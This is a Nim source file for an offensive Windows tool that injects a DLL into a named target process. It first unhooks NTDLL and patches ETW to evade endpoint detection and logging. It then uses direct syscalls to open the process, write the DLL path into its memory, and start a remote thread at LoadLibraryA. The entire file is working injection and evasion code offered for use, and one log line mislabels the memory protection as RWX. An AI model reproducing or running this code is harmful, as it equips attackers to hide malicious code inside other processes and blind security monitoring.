import evasion/[unhookNTDLL, etwPatch]
import winim/lean
import os, strformat, cligen
include syscalls

proc evasion() =
    echo("[*] Starting Evasion Module ....")
    sleep 1500
    let ntdllSec = unhookNTDLL()
    let etwSec = patchETW()
    echo(fmt"[+] NTDLL UnHook -> {ntdllSec}")
    echo(fmt"[+] ETW Patch -> {etwSec}")

proc FindProcess(procname: string): DWORD =
    var
        szLen1: ULONG = 0
        szLen2: ULONG = 0
    discard NtQuerySystemInformation(cast[SYSTEM_INFORMATION_CLASS](5) , NULL , 0 ,&szLen1)
    var spi : PSYSTEM_PROCESS_INFORMATION = cast[PSYSTEM_PROCESS_INFORMATION](HeapAlloc(GetProcessHeap() , HEAP_ZERO_MEMORY , szLen1))
    discard NtQuerySystemInformation(cast[SYSTEM_INFORMATION_CLASS](5) , spi , szLen1 , &szLen2)
    while spi.NextEntryOffset != 0:
        let name = $spi.ImageName.Buffer
        let pid = spi.UniqueProcessId.DWORD
        if lstrcmpiA(name, procname) == 0:
            return pid
        spi = cast[PSYSTEM_PROCESS_INFORMATION](cast[ULONG_PTR](spi) + spi.NextEntryOffset)

proc ObtainHandle(PID: DWORD): HANDLE =
    var hProc: HANDLE
    var objAtt: OBJECT_ATTRIBUTES
    var clientId: CLIENT_ID
    clientId.UniqueProcess = PID
    clientId.UniqueThread = 0.DWORD
    InitializeObjectAttributes(&objAtt, NULL , 0 , cast[HANDLE](NULL) , cast[PSECURITY_DESCRIPTOR](NULL))
    let res = NtOpenProcess(&hProc , PROCESS_ALL_ACCESS, &objAtt, &clientId)
    if res == STATUS_SUCCESS:
        return hProc

proc main(name: string, dllpath: string) =
    evasion()
    let pid = FindProcess(name)
    let hProc = ObtainHandle(pid)
    echo(fmt"[+] Handle [{hProc}]")
    if hProc == INVALID_HANDLE_VALUE or hProc == 0:
        echo("[-] Failed to Get Handle.")
        return
    var buffer: LPVOID
    var writtenBytes: SIZE_T
    var oldAccess: ULONG
    var regSize: SIZE_T = cast[SIZE_T](dllpath.len() + 1)
    let okAlloc = NtAllocateVirtualMemory(hProc, &buffer, 0, &regSize, MEM_COMMIT, PAGE_READWRITE)
    if okAlloc == 0:
        echo("[+] Allocation OK!")
    let okWrite = NtWriteVirtualMemory(hProc, buffer, cast[PVOID](dllpath.LPCSTR), cast[SIZE_T](dllpath.len() + 1), &writtenBytes)
    if okWrite == 0:
        echo(fmt"[+] Write OK! {writtenBytes} Bytes.")
    let okProtect = NtProtectVirtualMemory(hProc, &buffer, &regSize, PAGE_EXECUTE_READ, &oldAccess)
    if okProtect == 0:
        echo("[+] Protection [RWX] OK!")
    var thread: HANDLE
    var krnl32 = GetModuleHandleA("kernel32.dll")
    var loadlib =  GetProcAddress(krnl32, "LoadLibraryA")
    let okThread = NtCreateThreadEx(&thread, 0x1FFFFF, NULL, hProc, cast[LPTHREAD_START_ROUTINE](loadlib), buffer, FALSE, 0, cast[SIZE_T](NULL),cast[SIZE_T](NULL) , NULL)
    if okThread == 0:
        echo("[+] Thread OK!")
    let okWait = NtWaitForSingleObject(thread, FALSE , NULL)
    if okWait == 0:
        echo("[+] Waiting For Thread....")
        sleep 5000
    #WaitForSingleObject(thread , 300000)
when isMainModule:
    dispatch main